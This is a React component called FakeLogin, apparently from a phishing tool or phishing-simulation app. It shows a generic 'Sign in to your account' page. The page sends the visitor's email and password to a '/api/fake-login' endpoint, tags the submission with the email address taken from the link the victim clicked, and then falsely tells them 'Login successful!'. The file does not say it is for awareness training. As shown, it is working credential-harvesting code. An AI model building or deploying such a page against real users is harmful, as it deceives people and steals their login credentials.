import React, { useState, useEffect } from "react";
import { useParams } from "react-router-dom";

function FakeLogin() {
  const [emailInput, setEmailInput] = useState("");
  const [password, setPassword] = useState("");
  const [submitted, setSubmitted] = useState(false);
  const [sourceEmail, setSourceEmail] = useState("");

  const { email } = useParams(); // ✅ Correct param name

  useEffect(() => {
    if (email) {
      setSourceEmail(email);
    }
  }, [email]);

  const handleSubmit = async (e) => {
    e.preventDefault();

    try {
      await fetch("/api/fake-login", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          email: emailInput,
          password,
          clickedFrom: sourceEmail || "Direct Access",
        }),
      });

      setSubmitted(true);
    } catch (err) {
      console.error("❌ Submission failed:", err);
    }
  };

  if (submitted) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-100">
        <h2 className="text-xl font-semibold text-green-600">
          ✅ Login successful!
        </h2>
      </div>
    );
  }

  return (
    <div className="min-h-screen flex items-center justify-center bg-gray-100">
      <form
        onSubmit={handleSubmit}
        className="bg-white p-8 rounded-lg shadow-lg w-full max-w-md"
      >
        <h2 className="text-2xl font-bold mb-6 text-center">
          Sign in to your account
        </h2>
        <input
          type="email"
          placeholder="Email address"
          className="w-full mb-4 p-2 border rounded"
          required
          onChange={(e) => setEmailInput(e.target.value)}
        />
        <input
          type="password"
          placeholder="Password"
          className="w-full mb-6 p-2 border rounded"
          required
          onChange={(e) => setPassword(e.target.value)}
        />
        <button
          type="submit"
          className="w-full bg-blue-600 text-white py-2 rounded hover:bg-blue-700"
        >
          Sign In
        </button>
      </form>
    </div>
  );
}

export default FakeLogin;
